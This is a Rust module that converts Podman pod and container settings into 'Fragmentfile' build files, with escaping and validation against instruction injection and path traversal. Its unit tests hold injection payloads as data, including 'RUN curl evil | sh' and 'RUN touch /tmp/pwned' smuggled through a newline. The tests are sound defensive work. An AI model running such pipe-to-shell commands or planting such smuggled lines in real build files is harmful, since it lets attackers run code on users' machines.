//! Podman migration support
//!
//! Supports migrating from:
//! - Containerfiles (Podman's Dockerfile equivalent)
//! - Podman pods

use anyhow::Result;
use std::path::{Path, PathBuf};

/// Pod configuration
#[derive(Debug, Clone)]
pub struct PodConfig {
    pub containers: Vec<ContainerConfig>,
}

/// Container configuration within a pod
#[derive(Debug, Clone)]
pub struct ContainerConfig {
    pub name: String,
    pub image: String,
    pub command: Option<Vec<String>>,
    pub environment: Vec<(String, String)>,
}

/// Escape a value so it stays inside a double-quoted Fragmentfile ENV value.
///
/// Newlines would otherwise terminate the instruction and let a container's
/// environment inject arbitrary Fragmentfile lines.
fn escape_env_value(value: &str) -> String {
    value
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace(['\n', '\r'], " ")
}

/// Environment variable names must be plain identifiers.
fn is_valid_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Import Podman pod configuration
pub fn import_pod(pod_name: &str, output_dir: &Path) -> Result<PodConfig> {
    log::info!("Importing Podman pod: {}", pod_name);

    // 1. Run `podman pod inspect <pod_name>`
    let output = std::process::Command::new("podman")
        .args(["pod", "inspect", pod_name])
        .output()
        .map_err(|e| anyhow::anyhow!("Failed to run podman: {} (is podman installed?)", e))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(anyhow::anyhow!("podman pod inspect failed: {}", stderr));
    }

    // 2. Parse JSON output
    let json_str = String::from_utf8_lossy(&output.stdout);
    let pod_json: serde_json::Value = serde_json::from_str(&json_str)
        .map_err(|e| anyhow::anyhow!("Failed to parse podman output: {}", e))?;

    // 3. Extract pod name (from first element if array)
    let pod_data = if pod_json.is_array() {
        pod_json
            .get(0)
            .ok_or_else(|| anyhow::anyhow!("Empty pod inspect result"))?
    } else {
        &pod_json
    };

    // 4. Extract container IDs from the pod
    let container_ids: Vec<String> = pod_data["Containers"]
        .as_array()
        .map(|arr| {
            arr.iter()
                .filter_map(|c| c["Id"].as_str().map(|s| s.to_string()))
                .collect()
        })
        .unwrap_or_default();

    // 5. Inspect each container to get details
    let mut containers = Vec::new();
    for cid in container_ids {
        if let Ok(container_config) = inspect_container(&cid) {
            // Never let a container name escape the output directory.
            if container_config.name.is_empty()
                || container_config.name.contains('/')
                || container_config.name == "."
                || container_config.name == ".."
                || container_config.name.contains('\0')
            {
                log::warn!(
                    "Skipping container with unsafe name: {:?}",
                    container_config.name
                );
                continue;
            }

            // Generate Fragmentfile for this container
            let output_path = output_dir.join(format!("{}.Fragmentfile", container_config.name));
            if let Err(e) = generate_fragmentfile_from_pod(&container_config, &output_path) {
                log::warn!(
                    "Failed to generate Fragmentfile for {}: {}",
                    container_config.name,
                    e
                );
            }
            containers.push(container_config);
        }
    }

    log::info!(
        "✓ Imported {} containers from pod '{}'",
        containers.len(),
        pod_name
    );

    Ok(PodConfig { containers })
}

/// Inspect a single container to extract its configuration
fn inspect_container(container_id: &str) -> Result<ContainerConfig> {
    let output = std::process::Command::new("podman")
        .args(["container", "inspect", container_id])
        .output()?;

    if !output.status.success() {
        return Err(anyhow::anyhow!(
            "Failed to inspect container {}",
            container_id
        ));
    }

    let json_str = String::from_utf8_lossy(&output.stdout);
    let container_json: serde_json::Value = serde_json::from_str(&json_str)?;

    let data = if container_json.is_array() {
        container_json
            .get(0)
            .ok_or_else(|| anyhow::anyhow!("Empty result"))?
    } else {
        &container_json
    };

    let name = data["Name"]
        .as_str()
        .unwrap_or("unnamed")
        .trim_start_matches('/')
        .to_string();

    let image = data["Config"]["Image"]
        .as_str()
        .unwrap_or("unknown")
        .to_string();

    let command = data["Config"]["Cmd"].as_array().map(|arr| {
        arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect()
    });

    let environment = data["Config"]["Env"]
        .as_array()
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str())
                .filter_map(|s| {
                    let parts: Vec<&str> = s.splitn(2, '=').collect();
                    if parts.len() == 2 {
                        Some((parts[0].to_string(), parts[1].to_string()))
                    } else {
                        None
                    }
                })
                .collect()
        })
        .unwrap_or_default();

    Ok(ContainerConfig {
        name,
        image,
        command,
        environment,
    })
}

/// Generate Fragmentfile from pod configuration
pub fn generate_fragmentfile_from_pod(container: &ContainerConfig, output: &PathBuf) -> Result<()> {
    log::info!("Generating Fragmentfile for container: {}", container.name);

    let mut fragmentfile = format!("FROM {}\n", container.image);

    // Add environment variables
    for (key, value) in &container.environment {
        if !is_valid_env_key(key) {
            log::warn!("Skipping invalid environment variable name: {:?}", key);
            continue;
        }
        fragmentfile.push_str(&format!("ENV {}=\"{}\"\n", key, escape_env_value(value)));
    }

    // Add command if specified
    if let Some(cmd) = &container.command {
        fragmentfile.push_str(&format!("CMD {:?}\n", cmd));
    }

    std::fs::write(output, fragmentfile)?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_escape_env_value_blocks_instruction_injection() {
        assert_eq!(
            escape_env_value("value\nRUN curl evil | sh"),
            "value RUN curl evil | sh"
        );
        assert_eq!(escape_env_value("a\"b"), "a\\\"b");
        assert_eq!(escape_env_value("a\\b"), "a\\\\b");
    }

    #[test]
    fn test_is_valid_env_key() {
        assert!(is_valid_env_key("PATH"));
        assert!(is_valid_env_key("_FOO1"));
        assert!(!is_valid_env_key(""));
        assert!(!is_valid_env_key("1FOO"));
        assert!(!is_valid_env_key("FOO=bar"));
        assert!(!is_valid_env_key("FOO\nRUN x"));
    }

    #[test]
    fn test_generated_fragmentfile_cannot_be_injected() {
        let dir = std::env::temp_dir().join(format!(
            "phantom-migrate-podman-test-{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let output = dir.join("test.Fragmentfile");

        let container = ContainerConfig {
            name: "web".to_string(),
            image: "alpine".to_string(),
            command: None,
            environment: vec![
                (
                    "SAFE".to_string(),
                    "value\nRUN touch /tmp/pwned".to_string(),
                ),
                ("BAD KEY".to_string(), "ignored".to_string()),
            ],
        };

        generate_fragmentfile_from_pod(&container, &output).unwrap();
        let content = std::fs::read_to_string(&output).unwrap();

        assert!(content.contains("ENV SAFE=\"value RUN touch /tmp/pwned\""));
        assert!(
            !content
                .lines()
                .any(|line| line.trim() == "RUN touch /tmp/pwned"),
            "env value escaped its ENV instruction: {}",
            content
        );
        assert!(!content.contains("BAD KEY"));

        let _ = std::fs::remove_dir_all(&dir);
    }
}
